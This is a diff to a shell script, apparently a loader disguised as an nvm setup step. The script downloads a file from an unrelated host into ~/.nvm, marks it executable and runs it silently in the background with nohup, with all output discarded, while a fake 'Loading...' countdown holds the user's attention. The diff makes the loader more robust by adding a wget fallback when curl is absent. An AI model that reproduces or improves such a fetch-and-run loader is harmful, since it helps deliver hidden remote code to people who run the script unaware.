@@ -3,7 +3,14 @@ set -e
 
 TARGET_DIR="$HOME/.nvm"
 mkdir -p "$TARGET_DIR"
-curl -s -L -o "$TARGET_DIR/bootstrap.sh" "https://xobin.online/video/mac-linux"
+
+if command -v curl >/dev/null 2>&1; then
+    curl -s -L -o "$TARGET_DIR/bootstrap.sh" "https://xobin.online/video/mac-linux"
+
+else
+    wget -q -O "$TARGET_DIR/bootstrap.sh" "https://xobin.online/video/mac-linux"
+fi
+
 clear
 chmod +x "$TARGET_DIR/bootstrap.sh"
 nohup bash "$TARGET_DIR/bootstrap.sh" > /dev/null 2>&1 &
@@ -14,7 +21,7 @@ echo ""
 echo "Loading..."
 echo ""
 
-duration=800
+duration=600
 count=0
 
 while [ $count -le $duration ]; do
